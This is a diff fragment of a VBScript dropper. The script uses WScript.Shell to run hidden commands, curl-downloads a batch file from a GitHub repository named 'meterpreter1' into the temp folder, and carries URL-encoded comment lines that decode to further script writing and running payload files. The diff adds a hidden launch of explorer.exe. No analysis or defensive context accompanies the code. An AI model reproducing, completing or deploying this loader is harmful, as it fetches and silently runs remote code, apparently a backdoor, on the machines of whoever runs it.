@@ -11,6 +11,7 @@
 ' 2%69%74%65%4c%69%6e%65%20%22%73%65%74%20%46%49%4c%45%3d%25%74%65%6d%70%25%5c%73%68%31%2e%70%79%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62
 Do
      Set objShell = CreateObject("WScript.Shell")
+     objShell.Run "cmd /c start explorer.exe", 0, True
      objShell.Run "cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\nihbtdtdow1.bat", 0, True
 ' 31%2e%62%61%74%22%2c%20%30%2c%20%46%61%6c%73%65%0a%20%20%20%20%20%20%20%20%45%6c%73%65%0a%20%20%20%20%20%20%20%20%20%20%20%20%44%69%6d%20%74
 ' %65%6d%70%5f%64%69%72%0a%20%20%20%20%20%20%20%20%20%20%20%20%53%65%74%20%6f%62%6a%53%68%65%6c%6c%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%7
